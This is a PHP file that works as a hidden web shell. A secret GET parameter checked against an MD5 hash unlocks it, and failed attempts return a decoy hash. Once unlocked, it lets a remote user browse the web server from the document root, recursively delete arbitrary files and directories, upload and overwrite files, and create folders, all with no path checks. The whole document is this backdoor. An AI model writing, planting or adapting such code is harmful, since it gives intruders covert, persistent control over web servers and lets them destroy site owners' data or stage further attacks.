<?php
error_reporting(E_ALL & ~E_NOTICE);
date_default_timezone_set('Asia/Shanghai'); 
header("Content-type: text/html; charset=utf-8"); 

//获取当前页URL
function GetCurUrl()
{ 
	if(!empty($_SERVER["REQUEST_URI"])) 
	{ 
		$scriptName = $_SERVER["REQUEST_URI"]; 
		$nowurl = $scriptName; 
	}else {
		$scriptName = $_SERVER["PHP_SELF"]; 
		if(empty($_SERVER["QUERY_STRING"])) { 
			$nowurl = $scriptName; 
		} 
		else {
			$nowurl = $scriptName."?".$_SERVER["QUERY_STRING"]; 
		}
	}
	return $nowurl;
}

function is_utf8($string) {
return preg_match('%^(?:
[\x09\x0A\x0D\x20-\x7E] # ASCII
| [\xC2-\xDF][\x80-\xBF] # non-overlong 2-byte
| \xE0[\xA0-\xBF][\x80-\xBF] # excluding overlongs
| [\xE1-\xEC\xEE\xEF][\x80-\xBF]{2} # straight 3-byte
| \xED[\x80-\x9F][\x80-\xBF] # excluding surrogates
| \xF0[\x90-\xBF][\x80-\xBF]{2} # planes 1-3
| [\xF1-\xF3][\x80-\xBF]{3} # planes 4-15
| \xF4[\x80-\x8F][\x80-\xBF]{2} # plane 16
)*$%xs', $string);
}
function rrmdir($dir) {
    foreach(glob($dir . '/*') as $file) {
        if(is_dir($file))
            rrmdir($file);
        else
            unlink($file);
    }
    rmdir($dir);
}
if(md5($_GET['dps'])!='249d4bfbb78ef4b9456695183ffae635'){
	exit('9f2b035a4826b54d5cce80ec9228f389');
}
$del = trim(stripslashes($_GET['del']));
if($del){
	if(is_dir($del)){
		@rrmdir($del);
	}elseif(is_file($del)){
		@unlink($del);
	}
}

$dir = $_GET['dir'] ? trim(stripslashes($_GET['dir'])) : $_SERVER['DOCUMENT_ROOT'];
if(!is_dir($dir)) $dir = dirname($dir);
is_dir($dir) or die('dir error');

parse_str($_SERVER['QUERY_STRING'],$parse);
?>
<html>
<head>
</head>
<body>
<?php
if ($handle = opendir($dir)) {
    while (false !== ($file = readdir($handle))) {
        if ($file != ".") {
			$file = iconv('GBK','UTF-8',$file);
			if($file=='..'){
				$file_root = dirname($dir);
			}else{
				$file_root .= $dir.'/'.$file;
			}
			$parse['dir'] = $file_root;
			$url = $_SERVER["PHP_SELF"].'?'.http_build_query($parse);
			if(is_dir($file_root)){
?>
				<a href="<?php echo $url ?>"><?php echo '['.$file.']' ?></a>
				<?php if($file!='..') echo '<a href="'.$url.'&del='.$file_root.'">DEL</a>'?>
				<br/>
<?php	
			}else
				echo $file.'&nbsp;&nbsp;<a href="'.$url.'&del='.$file_root.'">DEL</a><br/>';	
			unset($file_root);
        }
    }
    closedir($handle);
}

if(!empty($_FILES['file']['name'])){
	$upfile = $dir.'/'.$_FILES['file']['name'];
	if(is_file($upfile)){
		unlink($upfile) or die('del error');
	}
	move_uploaded_file($_FILES['file']['tmp_name'],$upfile) or die('upload error');	
	echo "<script type='text/javascript'>alert('成功')</script>";
}
if($_POST['folder']){
	mkdir($dir.'/'.$_POST['folder'],0700) or die('Failed to create folders...');
	echo "<script type='text/javascript'>alert('创建成功')</script>";
}

?>
<table>
<form  enctype='multipart/form-data' action="<?php unset($parse['del']);echo $_SERVER['PHP_SELF'].'?'.http_build_query($parse); ?>" method="POST" name="form">
<tr>
<td>
选择文件：<input type="file" name="file"/>
</td>
</tr>
<tr>
<td>
创建文件夹：<input type="text" name="folder"/>
</td>
</tr>
<tr>
<td>
<input type="submit" value="提交" />
</td>
</tr>
</form>
</table>
<script type="text/javascript">
</script>
</body>
</html>
